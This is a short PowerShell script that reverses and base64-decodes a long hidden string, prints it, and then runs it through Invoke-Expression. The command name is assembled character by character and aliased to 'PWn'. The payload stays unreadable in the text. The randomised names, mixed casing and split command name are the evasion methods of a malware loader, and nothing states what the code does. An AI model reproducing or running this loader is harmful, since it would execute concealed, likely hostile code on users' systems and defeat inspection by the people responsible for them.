$wdrUH6cgSfJnTRUi5 = "==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" ;
$AAo = $wdrUH6cgSfJnTRUi5.ToCharArray() ; [array]::Reverse($AAo) ; -join $AAo 2>&1> $null ;
$djz2MwqaYHE64FgDKTec = [SystEM.TEXt.encodING]::UTF8.gETsTRInG([sYStEM.cOnVERt]::FromBASe64sTRIng("$AAo")) ;

Write-Host "Decoded string (djz2MwqaYHE64FgDKTec): $djz2MwqaYHE64FgDKTec"

$PwNulsZYKjn322jerzCWs3PJuPB = "I"+"N"+"v"+"O"+"K"+"E"+"-"+"E"+"X"+"p"+"r"+"e"+"s"+"s"+"I"+"o"+"n" ; NeW-aLiAS -NAme PWn -VaLUE $pwNulsZYKjn322jerzCWs3PJuPB -fORCE ; PWn $djz2MwqaYHE64FgDKTec ;
